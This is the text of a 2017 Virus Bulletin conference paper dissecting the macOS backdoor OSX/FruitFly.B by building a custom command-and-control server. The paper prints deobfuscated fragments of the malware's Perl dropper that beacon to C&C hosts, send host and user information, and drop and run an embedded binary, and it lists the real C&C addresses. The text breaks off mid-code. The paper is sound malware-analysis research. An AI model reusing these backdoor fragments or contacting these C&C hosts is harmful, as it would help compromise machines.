{
    "id": "108b83c7-ea2f-48b5-98b1-9a1cd36a41b8",
    "created_at": "2023-01-12T15:03:48.792517Z",
    "updated_at": "2025-03-27T02:12:11.144386Z",
    "deleted_at": null,
    "sha1_hash": "7ee09449e4f167f50d2a3f2781a466ff0d1b4491",
    "title": "2017-11-01 - VB2017 - Offensive Malware Analysis - Dissecting OSX-FruitFly.B Via a Custom C&C Server",
    "authors": "",
    "file_creation_date": "2022-05-29T01:22:31Z",
    "file_modification_date": "2022-05-29T01:22:31Z",
    "file_size": 3016023,
    "plain_text": "# VB2017 paper: Offensive malware analysis: dissecting OSX/FruitFly.B via a custom C&C server\n\n**virusbulletin.com/virusbulletin/2017/11/vb2017-paper-offensive-malware-analysis-dissecting-osxfruitflyb-custom-cc-**\nserver/\n\n### Patrick Wardle\n\nSynack, USA\n\n_Copyright © 2017 Virus Bulletin_\n\nTable of contents\n\nIntroduction\n\nOSX/FruitFly.B\n\nTechnical triage\n\nWatching all things\n\nNetwork monitoring\n\nFile monitoring\n\nProcessing monitoring\n\nMouse and keyboard monitor\n\nCreating a custom C&C server\n\nCommand enumeration via C&C tasking\n\nCommand #2\n\nCommand #8\n\nConclusion\n\nReferences\n\nAppendix A\n\nOSX/FruitFly.B Perl script, subroutines\n\nSubcommand B\n\nSubcommand E\n\nSubcommand G\n\nSubcommand H\n\nSubcommand I\n\nSubcommand J\n\nSubcommand K\n\nSubcommand M\n\nSubcommand N\n\nSubcommand O\n\nSubcommand R\n\nSubcommand S\n\n\n-----\n\nSubcommand V\nSubcommand W\nSubcommand Y\nSubcommand Z\nAppendix B\nOSX/FruitFly.B commands\n\n## Abstract\n\nCreating a custom command-and-control (C&C) server for someone else's malware has a\nmyriad of benefits. If you can take over a domain, you may then be able to fully hijack other\nhackers' infected hosts. A more prosaic benefit is expediting analysis. While hackers and\ngovernments may be more interested in the former, as responsible malware analysts, we'll\nfocus on the latter.\n\nFruitFly, the first OS X/macOS malware of 2017, is a rather intriguing specimen. Selectively\ntargeting biomedical research institutions, it is thought to have flown under the radar for\nmany years. In this paper we'll begin by analysing the malware's dropper, an obfuscated Perl\nscript. As this language is rather archaic and uncommon in malware droppers, we'll discuss\nsome debugging techniques and fully deconstruct the script. We'll then dive into analysing\nthe 'B' variant of FruitFly which, even now, is only detected by a handful of security products.\nHowever, instead of fully reversing the sample, the paper will focus on an initial triage and\nshow how this was sufficient for the creation of a custom C&C server. With such a server, we\ncan easily coerce the malware to reveal its full capabilities. For example, the malware\ninvokes a handful of low-level mouse and graphics APIs, passing in a variety of dynamic\nparameters. Instead of spending hours reversing and debugging this complex code, via the\nC&C server, we can simply send it various commands and observe the effects. Of course,\nthis approach hinges on the ability to closely observe the malware's actions. As such, we'll\ndiscuss macOS-specific tools that can monitor various events, and where necessary detail\nthe creation of custom ones (e.g. a 'mouse sniffer' that observes locally and decodes\ncommands sent from the malware to the OS, in order to control the mouse). While some of\nthis paper is FruitFly and/or macOS‑specific, conceptually it should apply broadly to\nanalysing other malware, even on other operating systems.\n\n## Introduction\n\nIt's no secret that comprehensively analysing a piece of malware is a time-consuming\nprocess. Traditionally, a malware analyst will pull apart a sample via a hybrid approach that\ncombines static and dynamic analysis via tools such a disassemblers and debuggers. And\nwhile this approach can (eventually) uncover a malware's capabilities, the process may be\nrather complicated and inefficient. This is especially true if the malicious code responsible for\nprocessing commands cannot be triggered – for example if the malware's command and\ncontrol (C&C) server has been taken offline.\n\n\n-----\n\nIn this research paper, we ll show that instead of performing analysis solely via more\n'traditional' means, one may be able to take a more efficient route. By focusing reversing\nefforts on the malware's code related to its protocol, we will be able to create a custom (albeit\nbasic) C&C server. Armed with such a server we'll show that the malware can be coerced\ninto revealing its full capabilities, simply by asking the right 'questions'.\n\nSpecifically by tasking the malware from the custom C&C server and then closely observing\nwhat action is performed in response to the command (even if one isn't sure what the\ncommands does), the malware's capabilities can efficiently and easily be ascertained. In this\npaper, we'll utilize a custom C&C server to fully analyse an interesting piece of macOS\nmalware, OSX/FruitFly.B. As this malware speaks a fairly basic protocol, yet supports a\nmyriad of integer-based commands, it's the perfect sample for a case study of this effective\nanalysis technique.\n\nThe remainder of the paper is organized as follows: First, we'll provide a high-level triage of\nOSX/FruitFly.B, which will give us enough of an understanding to create a simple C&C\nserver. Before discussing the creation of this server, though, we'll detail various macOSspecific tools and utilities that (once our C&C server is operational) will allow us to monitor\nthe malware closely, yet passively, as it responds to our tasking. In the next section we'll\ndetail the creation of the custom C&C server that allows the malware to be controlled. Finally,\nwe'll illustrate how this C&C server can then be used to task the malware, coercing it into\nfully exposing its capabilities.\n\nThe end result? A complete and comprehensive understanding of the malware!\n\n## OSX/FruitFly.B\n\nDiscovered when an IT administrator 'spotted some strange outgoing network traffic from a\nparticular Mac' [1],\n\nOSX/FruitFly (also known as OSX/Quimitchin) was the first macOS malware discovered in\n2017. The discovery was aided by MalwareBytes (specifically, researcher Thomas Reed),\nwho detailed the capabilities of this threat in a blog post entitled 'New Mac backdoor using\nantiquated code' [1].\n\nIn this paper, besides illustrating how to analyse malware via a custom C&C server, our goal\nwas to provide the first comprehensive technical analysis of OSX/FruitFly, variant 'B' (SHA256: befa9bfe488244c64db096522b4fad73fc01ea8c4cd0323f1cbdee81ba008271).\n\nThough relatively closely related to the original variant,\n\nOSX/FruitFly.B only appeared (on VirusTotal [2]) weeks later. Interestingly, at the time of\nsubmission none of the anti-virus engines on VirusTotal detected it as malicious (see Figure\n1).\n\n\n-----\n\nFigure 1: FruitFly.B submission history on VirusTotal [2].\n\nLuckily, tools that alert generically on behaviours such as persistence should be able to\nprotect the user. For example, BlockBlock (written by the author) aims to generate an alert\nwhenever a new launch agent (such as OSX/FruitFly.A/.B) is installed (see Figure 2).\n\n\n-----\n\nFigure 2: BlockBlock in action [3].\n\nAs previously mentioned, instead of performing analysis of OSX/FruitFly.B solely via\ndisassemblers and debuggers we aim to take a more efficient approach by utilizing a custom\nC&C server.\n\nIn order to create a C&C server that is able to task the malware, we first need to perform\nsome cursory analysis of the malware. Our goals for this initial 'high-level' analysis are not to\nunderstand the full capabilities of the malware but rather to:\n\n1. Determine the address(es) of the malware's command‑and‑control (C&C) server(s).\n2. Understand the protocol that the malware expects the C&C to speak.\n\n### Technical triage\n\nThough OSX/FruitFly.B's initial infection vector remains unknown, we do know that it is\ninstalled persistently. The original variant of the malware (OSX/FruitFly.A) creates a property\nlist (.plist) file, com.client.client.plist, in the user's LaunchAgent directory [1] (see Figure 3).\n\n\n-----\n\nFigure 3: OSX/FruitFly.A's persistent launch agent .plist.\n\nAs detailed both by Apple [4] and in our previous research (presented at VB2014 [5]),\ncreating a launch agent with the RunAtLoad key set to true instructs the operating system to\nautomatically execute whatever is specified in the ProgramArguments array. In\nOSX/FruitFly.A's com.client.client.plist, one can see that this value is set to execute\nsomething named '.client' from the users's home directory.\n\nThough registering as a launch agent is neither a novel nor stealthy method of persistence, it\nwill ensure that\n\nOSX/FruitFly is started automatically every time the infected host is rebooted.\n\nDue to the myriad of similarities between OSX/FruitFly.A and OSX/FruitFly.B, although the\npersistence mechanism for variant 'B' remains unknown, its very likely also to persist as a\nlaunch agent. However, one known difference between the malware variants is the name of\nthe persistent component. OSX/FruitFly.A persists an item named '.client' while\nOSX/FruitFly.B appears to use the name 'fpsaud'.\n\n\n-----\n\nFigure 4: 'In-the-wild' filename: fpsaud [2].\n\nRegardless of the variant, interestingly the persistent component of the malware is a Perl\nscript.\n\nFigure 5: File type identification of the malware's persistent component.\n\nTaking a closer look at OSX/FruitFly.B's persistent component, fpsaud, we can see that it has\nbeen obfuscated, probably in an attempt to thwart or complicate analysis.\n\nFigure 6: Script obfuscation.\n\n\n-----\n\nHowever the obfuscation is scheme is rather weak: the code is simply minimized and the\ndescriptive names for all variables and subroutines have been replaced with meaningless\nsingle-letter ones.\n\nFirst, let's 'unminimize' the script. While this can be done manually, it's far simpler to utilize\nan online Perl 'beautifier' [6].\n\nThe output of the 'deminimization' or 'beautification' process produces a more pleasingly\nformatted version of the script (though the names of variables and subroutines, of course,\nremain nonsensical).\n\nFigure 7: Deobfuscated Perl script.\n\n_Note: the remainder of this paper will reference the deobfuscated script, showing relevant_\n_code snippets as needed. When such snippets are shown, comments have often been_\n_added (by us) to further clarify the code. The malicious Perl script did not contain any_\n_comments._\n\nThe script begins with various 'use' statements (which import 'semantics' from a named\nmodule into the current script), which provides some high-level insight into its functionality.\nFor example, 'use IO::Socket' indicates that the script likely contains networking logic, while\n'use IPC::Open2' implies that the malware likely interacts with (child?) processes.\n\nFollowing the 'use' statements are various helper subroutines. These perform basic tasks\nsuch as reading and writing data to the socket associated with the C&C server connection,\nas shown in Listing 1.\n\n\n-----\n\n```\n#connect to C&C\n$l = new IO::Socket::INET(\n     PeerAddr => scalar( reverse $g ),\n     PeerPort => $h,\n     Proto => 'tcp',\n     Timeout => 10\n  );\n#send data to C&C\nsub G\n{\n  die if !defined syswrite $l, $_[0]\n}\n\n```\nListing 1: Subroutine 'G'.\n\nOther subroutines deal with actions such as reading and writing to files:\n```\n#write data to a file\nsub S {\n  open F, '>', $_[0] or return undef;\n  binmode F;\n  print F $_[1] or return undef;\n  close F;\n  return 1;\n}\n\n```\nListing 2: Subroutine 'S'.\n\nPerhaps the most interesting subroutine, though, is 'V':\n```\n#write out embedded binary (via 'S')\n# then exec it, then write passed in arg to proc's stdin\nsub V {\n  alarm 30;\n  if ( !$P ) {\n    alarm 120;\n    return undef if !$u || !S( $M, $u );\n    chmod 0777, $M;\n    $P = open2( $H, $Q, $b );\n    if ( !$O ) { sleep 1; unlink $M }\n  }\n  return undef if !$P;\n  return 1 if defined syswrite $Q, $_[0];\n  return R();\n}\n\n```\nListing 3: Subroutine 'V'.\n\nSubroutine 'V' writes out a stream of embedded data ($u) before executing it via open2(). It\nthen writes a passed in parameter ($_[0]) to the new process's stdin ($Q). This embedded\ndata (which turns out to be an encoded machO binary) will be discussed shortly.\n\n\n-----\n\nNote that all subroutines were fully analysed and are documented in Appendix A.\n\nFollowing the helper subroutines the script continues by declaring and assigning values to\nvarious variables. For example encoded strings:\n```\nmy ( $h, @r ) = split /a/,\nM('11b36-301-;;2-45bdql-lwslk-hgjfbdql-pmgh'vg-hgjf');\n\n```\nListing 4: Encoded strings.\n\n'M' is a helper subroutine that decodes a string via XOR (key: 0x3). In order to determine the\nvalues of $h and @r we can decode the string manually. This is easy enough to do in Python\n(see Figure 8) – or we can use Perl's built-in debugger to observe the malware decoding the\nstrings itself.\n\nFigure 8: Decoding strings via Python.\n\nSuccinctly documented in man perldebug, the Perl debugger provides a simple way to\nanalyse Perl scripts dynamically.\n\nFigure 9: Perl debugger's man page.\n\nTable 1 documents some common Perl debugger commands that were useful when\nanalysing the malicious Perl script.\n\n|Command|Description|\n|---|---|\n|-d <script.pl>|Start a script under the debugger|\n|R|Restart|\n\n\n-----\n\n|n|Single step (over subroutines)|\n|---|---|\n|s|Single step (into subroutines)|\n|p <variable>|Display value of a variable|\n|.|Display the current line/instruction|\n|l <line #>|Display code at line number|\n|b <line #>|Set a breakpoint on line number|\n|B <line #>|Remove the breakpoint on line number|\n|L|List breakpoints|\n|T|Display 'stack'/caller backtrace|\n\n\nTable 1: Common Perl debugging commands.\n\nTo start a debugging OSX/FruitFly.B's malicious Perl script, simply execute $ perl -d fpsaud.\n\nAlthough one can use the 'b <line #>' debugger command to set a breakpoint on a line of\ncode, since the code which deobfuscates the string (11b36-301-;;2-45bdql-lwslkhgjfbdqlpmgh'vg-hgjf) is near the start of script, it is simpler just to begin single-stepping via the 'n'\ndebugger command.\n\nFigure 10: Single stepping.\n\nStepping over the decoding subroutine ('M') via the 'n' debugger command allows us then to\nprint the vales of the $h and @r variables via the 'p' debugger command.\n\n\n-----\n\nFigure 11: Decoded strings via Perl's debugger.\n\nLooking ahead in the script for a moment, it is apparent that $h is the port on which the\ncommand-and-control server is listening (port 22), while the values in the array @r are the\naddresses of the command-and-control servers, albeit reversed, as shown in Listing 5.\n\nManually reversing the three values in the @r array provides us with the addresses of the\nmalware's primary C&C servers:\n\n1. 05.032.881.76 -> 67.188.230.50\n2. gro.otpoh.kdie -> eidk.hopto.org\n3. gro.sndkcud.kdie -> eidk.duckdns.org\n```\n#grab value (C&C address) from @r\n$g = shift @r; push @r, $g;\n#connect to C&C server\n# $g: reversed C&C address\n# $h: C&C port\n$l = new IO::Socket::INET(\n  PeerAddr => scalar( reverse $g ),\n  PeerPort => $h,\n  Proto => 'tcp',\n  Timeout => 10\n);\n\n```\nListing 5: Connecting to C&C server.\n\nNext, the script generates a 'backup' list of C&C servers:\n```\n#generate list of backup C&C servers\nfor my $B ( split /a/, M('1fg7kkb1nnhokb71jrmkb;rm';kb1fplifeb1njgule') )\n{\n   push @e, map $_ . $B, split /a/, M('dql-lwslk-bdql-pmgh'vg-');\n}\n\n```\nListing 6: List of backup C&C servers.\n\n\n-----\n\nAfter stepping over this loop, we can print out (and again, reverse), the values in the array\n@e. Due to the fact that the addresses of these C&C servers are currently available for\nregistration, they have been obfuscated:\n\n\n**Server address**\n\n\nhxxxxx.hopto.org\n\n\nhxxxxx.duckdns.org\n\n\nhxxxxx.hopto.org\n\n\nhxxxxx.duckdns.org\n\n\nhxxxxx.hopto.org\n\n\nhxxxxx.duckdns.org\n\n\nhxxxxx.hopto.org\n\n\nhxxxxx.duckdns.org\n\n\nfxxxxxx.hopto.org\n\n\nfxxxxxx.duckdns.org\n\n\nfxxxxxx.hopto.org\n\n\nfxxxxxx.duckdns.org\n\n\nTable 2: Backup C&C servers.\n\nFollowing the generation of the C&C server addresses the malicious script checks to see if it\nwas executed with any command line arguments:\n```\n#save port, or addr:port\nif ( @ARGV == 1 ) {\n if ( $ARGV[0] =~ /^\\d+$/ ) { $h = $ARGV[0] }\n elsif ( $ARGV[0] =~ /^([^:]+):(\\d+)$/ ) {\n   ( $h, @r ) = ( $2, scalar reverse $1 );\n }\n}\n\n```\nListing 7: Command line arguments check.\n\nIf a single argument is provided and is a number, it is saved into the $h variable. If the\ncommand-line argument adheres to the format: 'string:number' the script will parse it to\nextract the string into @r and the numeric value into $h. As previously mentioned, $h is the\nport which the malware uses to connect to the C&C server, while @r is an array of C&C\n\n\n-----\n\nservers. As such, this chunk of code allows one to pass in an address/port of a C&C server\nthat the malware will connect to. When creating a custom C&C server, being able to specify\nthe address of the server via the command line is a rather helpful capability!\n\nNext, the script executes the following:\n```\n# 'change' process name\n$0 = 'java';\n\n```\nListing 8: Basic 'process hiding'.\n\nThis sets the process name to java, which can 'trick' tools such as ps. It's nothing fancy, but\nit's neat to see some basic stealth techniques.\n\nFigure 12: 'Process hiding' (before and after).\n\nNext, OSX/FruitFly.B decodes a large chunk of data that turns out to be an embedded\nmachO executable:\n```\n#decode embedded binary data\nmy $u = join '', <DATA>;\nmy $W = pack 'H*', 'b02607441aa086';\n$W x= 1 + length($u) / length($W);\n$u ^= substr $W, 0, length $u;\n$u =~ s/\\0(.)/v0 x(1+ord$1)/seg;\n\n```\nListing 9: Decoding embedded binary data.\n\nFirst, binary data (referenced by <DATA>) is assigned to $u. The binary data can be found at\nthe end of a malicious Perl script, immediately following __DATA__:\n```\n#encoded binary data\n__DATA__\n‹Í∫†á±%Eö¢Ü≤\"F˙°Ü±£B†Ñ¯&E\n«˜c]HÔÜ†÷g†Ñ(&EÙ√ËrHÍ†ÇÄ& t•Å∞$D°Ü∂yX0ÿÚ∞/\nXNÂfi‰&π†Ü@&G=†ÉM.J†Ü0&...\n\n```\nListing 10: Embedded binary data.\n\nThe script first XOR decodes this binary data with the key b02607441aa086 and then\ndecompresses it via the regex: s/\\0(.)/v0 x(1+ord$1)/seg. If we modify the malicious Perl\nscript to save the decoded data to disk and then dump it in a hex editor we observe values\nsuch as 4f 00 10:\n\n\n-----\n\nFigure 13: Hexdump of decoded (yet still compressed) data.\n\nAfter being decompressed, that same data has been converted into 4f 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00 00, as shown in Figure 14.\n\nFigure 14: Hexdump of decoded & decompressed data.\n\nThis illustrates that the binary data is compressed via a basic 'run length' encoding scheme.\nThe regex (s/\\0(.)/v0 x(1+ord$1)/seg) is what performs the decompression.\n\nMoving on, the script decodes a string, '/tmp/client', into the variables $M and $b:\n```\n#decode '/tmp/client'\nmy $M = M(',wns,'ojfmw');\nmy $b = M(',wns,'ojfmw');\n\n```\nListing 11: Encoded file path for embedded binary data.\n\nThe previously mentioned 'V' subroutine uses the $M variable as the file path when saving\nthe embedded binary data ($u) to disk.\n\nNext, the script sets a flag based on whether or not it is executing on macOS:\n```\n#am I on macOS?\nmy $z = $^O eq 'darwin';\n\n```\nListing 12: OS detection.\n\nIn Perl, 'the $^O variable ... will contain the name of the operating system' [7].\n\nDuring MalwareBytes' analysis of OSX/FruitFly.A, the researchers attempted to run it on\n_Linux, noting success: 'We found that – with the exception of the Mach-O binary – everything_\nran just fine' [1].\n\nFinally, the script enters its main processing loop where it:\n\n1. attempts to connect to one of its C&C servers\n2. processes tasking (commands) from the C&C server.\n\nTo select a C&C server, the malware grabs a random server from either the @r or @e array,\nbased on the modulus of the count of connection attempts:\n\n\n-----\n\n```\n#select C&C server\n$n++;\nmy $c = $n % 10;\nif  ($c) { $g = shift @r; push @r, $g; }\nelse    { $g = shift @e; push @e, $g; }\n\n```\nListing 13: C&C server address selection.\n\nIt then attempts to connect to the selected C&C server:\n```\n#select C&C server\n$l = new IO::Socket::INET(\n  PeerAddr => scalar( reverse $g ),\n  PeerPort => $h,\n  Proto => 'tcp',\n  Timeout => 10\n);\n\n```\nListing 14: Connecting to selected C&C server.\n\nAssuming the connection to the C&C server is successful, the malware first sends some\nbasic information (via the 'G' subroutine) before it processes any tasking:\n```\n#send client info to C&C server\nG v1\n  . Y(1143)\n  . Y( $q ? 128 : 0 )\n  . Z( ( $z ? I('scutil --get LocalHostName') : '' ) || I('hostname') )\n  . Z( I('whoami') );\n\n```\nListing 15: Sending basic client information to C&C server.\n\nIt then enters a second loop to process commands (tasking) from the C&C server.\nSpecifically, it invokes the 'J' subroutine to read the command. Commands are single-byte\ninteger values received from the C&C server. Once the command is received the malware\nselects the appropriate block of code to process it, via a rather large if/elsif block:\n```\n#read & process command from C&C server\nfor ( ; ; ) {\n  my $D = ord J 1;\n  if ( $D == 0 ) { }\n  elsif ( $D == 2 ) {\n    my ( $Z, $C ) = ( J 1 );\n    ...\n  }\n  elsif ( $D == 14 )\n  {\n    G v14 . K( !system N . ' &' )\n  }\n  elsif ( $D == 47 ) {\n    ...\n  }\n}\n\n```\n\n-----\n\nListing 16: Command processing loop.\n\nClearly, this is the core of the malware that receives and acts upon tasking from the C&C\nserver.\n\nAt this point our initial analysis has provided enough information to achieve our\naforementioned goals and prerequisites to begin creating a custom C&C server:\n\n1. Determine the address(es) of the C&C server(s).\n2. Understand the protocol that the malware expects the C&C to speak.\n\nSpecifically, we have a list of C&C servers to which the malware will attempt to connect. And\nwhile it would be fairly easy to modify the malware's environment so that it would instead\nconnect to our custom C&C server (e.g. by modifying /etc/hosts or by setting up our own\nDNS server), we have also uncovered that fact that the malware accepts an arbitrary C&C\npassed in via the command line. Thus we can simply specify the address of our custom C&C\nserver as a command‑line parameter:\n\nFigure 15: C&C server address via the command line.\n\nOur analysis has also provided us with a basic understanding of the malware's protocol.\n\nSpecifically, once the malware connects to a C&C server it:\n\n1. Sends some basic information about the infected host.\n2. Reads and processes single-byte integer commands from the C&C server.\n\nOf course, we don't currently know what each command does, or what is the purpose of the\nembedded machO binary. However, once our custom C&C server is up and running, these\nwon't remain unknowns!\n\n## Watching all things\n\nIn order to effectively create and utilize a custom C&C server for analytical purposes, one\nmust be able to closely monitor how the malware reacts to tasking. Thus, in this section of\nthe paper we'll briefly discuss several macOS‑specific monitoring tools and utilities. These\nwere essential both while building the custom C&C and while using this server to send the\nmalware various commands. In the case of the latter, these tools provided the ability to\npassively determine the malware's full capabilities as it responded to our tasking.\n\nSince macOS is somewhat lacking in terms of open-source monitoring tools, several custom\nutilizes were created specifically for this research. These will be made available, opensourced, online.\n\n\n-----\n\n### Network monitoring\n\nOn macOS there are several well-known network monitoring tools, such as tcpdump\n(/usr/sbin/tcpdump) and Wireshark. These tools were used initially to determine the primary\naddress(es) of the C&C server(s) of the malware.\n\nFor example, we can see that, when executed, OSX/FruitFly.B attempts to resolve one of its\nprimary C&C servers, eidk.hopto.org.\n\nFigure 16: Network capture of DNS request for C&C server.\n\nAs eidk.hopto.org currently resolves to 127.0.0.1 (localhost), it appears that the malware's\noriginal C&C server has been taken offline.\n\nWhen creating a custom C&C server, network monitoring tools are also incredibly useful for\ndecoding a malware's protocol. For example, instructing a piece malware to execute an\n(unknown) command and then observing the data sent back to the C&C server can often\nreveal the purpose of the command.\n\nFor example, OSX/FruitFly.B supports a command #13. Though we do not know what this\ncommand does (yet), we can task the malware to execute it (by sending a '13' from our\ncustom C&C server) and observe the response, as shown in Figure 17.\n\nFigure 17: Network capture of command #13's response.\n\nFrom the network capture in Figure 17 one can see that the likely purpose of command #13\nis to return the location on\n\n\n-----\n\nthe infected system where the malware is installed (e.g. ~/fspaud).This was determined\nwithout having to reverse the malware's implementation of the actual command at all. Neat!\n\n### File monitoring\n\nEssentially, all malware interacts with the file system of its infected host. When analysing any\nmalware sample it is quite likely that it will generate some file I/O events. For example, if the\nmalware exfiltrates data, this will generate file I/O read events, while a command to\ndownload data from the C&C server will trigger file I/O write events.\n\nOn macOS, Apple provides the fs_usage (/usr/bin/fs_usage) utility to monitor file system (fs)\nusage.\n\nFigure 18: Man page for fs_usage.\n\nOne can execute fs_usage (as root), with the -w and -f filesystem command-line parameters\nto begin capturing file system events. As this capture is global, it is wise to filter the output\nvia grep.\n\nFor example, Figure 19 shows the (abridged) capture of file system events that are\ngenerated when we task OSX/FruitFly.B to execute command #2.\n\nFigure 19: File I/O triggered by command #2.\n\nThere will be more on this command later, but it's pretty easy to see in the output from\nfs_usage, the malware writing out a file to /private/tmp/client, then at a later time deleting it.\n\n### Processing monitoring\n\n\n-----\n\nThe ability to monitor processes is essential when analysing a piece of malware, especially\nwhen one is utilizing a custom C&C server to coerce the malware to reveal its full\nfunctionality. This is due the fact that malware often spawns system utilities to perform basic\ntasks, or may even contain other executable components that it will drop and execute in\nresponse to certain commands.\n\nUnfortunately, in recent versions of macOS, dtrace (/usr/sbin/dtrace), which previously could\nbe used to track process creations, has been neutered by System Integrity Protection (SIP).\nThus, unless one reboots into the Recovery OS and disables SIP, dtrace is somewhat\nuseless. Even Apple's dtrace scripts such as execsnoop fail, as shown in Figure 20.\n\nFigure 20: Dtrace 'broken' thanks to System Integrity Protection (SIP).\n\nLuckily, we have other options. While rather poorly documented, and previously vulnerable to\na host of various exploitable kernel bugs [8, 9], the OpenBSM framework can be used to\ntrack the system-wide creation of processes from user-mode.\n\nAs we weren't aware of any open-source macOS process monitoring library\nimplementations, one was created specifically for this research. This library will be made\navailable online, fully open-sourced.\n\nUsing this new library, we can easily track the creation of processes. For example, Figure 21\nshows the output of the tool when OSX/FruitFly.B is tasked by our custom C&C server to\nexecute command #11.\n\nFigure 21: Process event triggered by command #11.\n\nVia the process monitor, we can see that command #11 retrieves the path to the working\ndirectory by executing 'pwd' (/usr/local/bin/pwd). A quick peek at the network monitoring\nutilities shows that this path is then sent to the C&C server, as the command's response.\n\n### Mouse and keyboard monitor\n\n\n-----\n\nAdvanced malware sometimes manipulates the mouse or generates key presses to interact\nwith GUI-based dialogs or pop-ups generated by security tools. Though quite rare in macOS\nmalware, MalwareBytes' report on OSX/FruitFly.A [1] mentioned the malware's ability to\ngenerate simulated mouse and keyboard events.\n\nOn the website of Amit Singh's Mac OS X _Internals book [10] lives some sample code for_\n'Receiving, Filtering, and Modifying Mouse Events' and 'Receiving, Filtering, and Modifying\nKey Presses and Releases'. Written for OS X 10.4, surprisingly these still work today and\nwere the basis for a utility that we created to monitor both mouse and keyboard events.\n\nAmit's code monitors for mouse movements and keyboard presses by creating an 'event tap'\nvia the CGEventTapCreate API. Listing 17 shows the event tap creation for mouse\nmovements:\n```\n//event mask for mouse moves\neventMask = (1 << kCGEventMouseMoved);\n//create tap\n// ->pass in user callback\neventTap = CGEventTapCreate(\n   kCGSessionEventTap, kCGHeadInsertEventTap,\n   0, eventMask, myCGEventCallback, NULL);\n\n```\nListing 17: Creating an event tap for mouse movements.\n\nAs shown in the code snippet, the CGEventTapCreate function takes various parameters,\nwhich are documented by Apple's online 'core graphics' API documentation [11].\n\nThe two parameters that should be 'customized' for events of interest are the event mask\nand the callback function [11]:\n\n1. CGEventMask eventsOfInterest:\n\nA bit mask that specifies the set of events to be observed.\n2. CGEventTapCallBack callback\n\nAn event tap callback function that you provide.\n\nSo, simply specify the events you'd like to monitor (e.g. mouse movements) and provide a\ncallback function. Once the 'event tap' for these events has been registered and enabled,\nwhenever such an event occurs the OS will automatically invoke your callback function.\n\nTo monitor for other mouse events (such as clicks, drags, etc.) as well as keyboard events,\nwe extended Amit's code:\n\n\n-----\n\n```\n//init event with mouse events & key presses\neventMask = CGEventMaskBit(kCGEventLeftMouseDown) |\n   CGEventMaskBit(kCGEventLeftMouseUp) |\n   CGEventMaskBit(kCGEventRightMouseDown) |\n   CGEventMaskBit(kCGEventRightMouseUp) |\n   CGEventMaskBit(kCGEventMouseMoved) |\n   CGEventMaskBit(kCGEventLeftMouseDragged) |\n   CGEventMaskBit(kCGEventRightMouseDragged) |\n   CGEventMaskBit(kCGEventKeyDown) |\n   CGEventMaskBit(kCGEventKeyUp);\n//create event tap\neventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0,\neventMask, eventCallback, NULL);\n\n```\nListing 18: Creating an event tap for both mouse and keyboard events.\n\nOur callback simply displays the type of the event, then prints out the key press value for\nkeyboard events and mouse coordinates for mouse events, as shown in Listing 19.\n```\n//callback for mouse/keyboard events\nCGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef\nevent, void *refcon)\n{\n  ...\n  //for key presses\n  // ->dump extra info\n  if( (kCGEventKeyDown == type) || (kCGEventKeyUp == type) )\n  {\n    //get code\n    keycode = (CGKeyCode)CGEventGetIntegerValueField(event,\n    kCGKeyboardEventKeycode);\n    //dbg msg\n    printf(\"keycode: %s\\n\\n\", keyCodeToString(keycode));\n  }\n  //for mouse\n  // ->print location\n  else\n  {\n    //get location\n    location = CGEventGetLocation(event);\n    //dbg msg\n    printf(\"(x: %f, y: %f)\\n\\n\", location.x, location.y);\n  }\n  return event;\n}\n\n```\nListing 19: Mouse/keyboard event callback function.\n\nTo test out this code, we execute it as root, then interact with the keyboard and mouse, as\nshown in Figure 22.\n\n\n-----\n\nFigure 22: Capturing keyboard ('abc') and mouse (left click) events.\n\nArmed with the ability to monitor network traffic, file I/O, process creations, and mouse and\nkeyboard events, once a custom C&C server has been created we'll be able to see exactly\nhow the malware responds to our tasking. This in turn will allow us to gain a comprehensive\nunderstanding of the malware's capabilities and the purpose of each of its commands.\n\nHowever, before we can create this custom C&C server we must first understand the\nprotocol the malware uses to communicate. In the next section, we'll perform a basic\nanalysis of the malware, with the goal of determining how it 'speaks'.\n\n## Creating a custom C&C server\n\nWe finally have all the pieces to begin creating our custom C&C server. Specifically, we have\na decent understanding of OSX/FruitFly.B's protocol as well as the necessary tools to\nmonitor how it responds to tasking once we've completed the C&C server.\n\nIn this section we'll describe how we created a custom command-and-control server that\nallowed us to task the malware in order to coerce it into revealing its full functionality.\n\nIt should be noted that the process of creating such a C&C was not wholly independent of\nother methods of analysis. That is to say, more traditional methods, such as static analysis of\nthe malware, still played a role, albeit to a lesser extent.\n\nIn a nutshell, creating the custom C&C server was accomplished in the following manner:\n\n\n-----\n\nFor each numeric command supported by the malware:\n\n1. Triage command to see:\n\n1. if it expects additional bytes/data from the C&C server\n2. the format of the response\n2. Send command to malware\n3. Send additional bytes to malware\n4. Receive and process data\n\nOur previous analysis of the malware's helper subroutines identified those that sent and\nreceived data from the server, as well as those subroutines that packed/unpacked network\ndata. Thus, it's trivial to triage a command to understand any 'command-specific' protocol.\n\nTake for example command 12:\n```\n#command #12\nelsif ( $D == 12 )\n{\n  my $Z = ord J 1;\n  my ( $S, $p ) = ( H, '' );\n  if ( $Z == 0 ) { $p = K( -e $S ) }\n  ...\n  elsif ( $Z == 8 || $Z == 9 )\n  {\n    ...\n  }\n    G v12 . chr($Z) . Z($S) . $p;\n}\n\n```\nListing 20: Command 12.\n\nWe know that the 'J' subroutine reads a single byte from the socket associated with the C&C\nserver. Similarly, the 'H' subroutine reads a variable length string (size, bytes) from the\nserver. On the flip side, the 'G' subroutine sends data back to the C&C server.\n\nThus, while we still don't (yet) know what command #12 does, we just illustrated how easy it\nwas to determine its protocol, as shown in Table 3.\n\n**Direction** **Size** **Value**\n\nsend 1 byte 0 - 9\n\nsend variable length unknown\n\nreceive 1 byte 12 (command #)\n\nreceive 1 byte 0 - 9 (what was sent)\n\nreceive variable length string previously sent\n\n|Direction|Size|Value|\n|---|---|---|\n|send|1 byte|0 - 9|\n|send|variable length|unknown|\n|receive|1 byte|12 (command #)|\n|receive|1 byte|0 - 9 (what was sent)|\n\n\n-----\n\nreceive 1 byte result of 'K'\n\nTable 3: Command #12's protocol.\n\nNote that the format of the command's response could also be determined passively simply\nby sniffing the network data of the command that is sent back to the C&C server.\n\nOur basic C&C server is written in Python. Again, its goal is simply to provide an adequate\nmeans to task the malware, and as such, it is not particularly elegant or robust. But as will be\nshown, it gets the job done!\n\nThe C&C server starts by creating a socket to listen for connections from the malware. As\nthe malware accepts an arbitrary address:port on its command line, the C&C server accepts\nan arbitrary port via the command line and listens on 0.0.0.0 (all interfaces):\n```\n#init socket\nsock = socket.socket(socket.AF_INET, 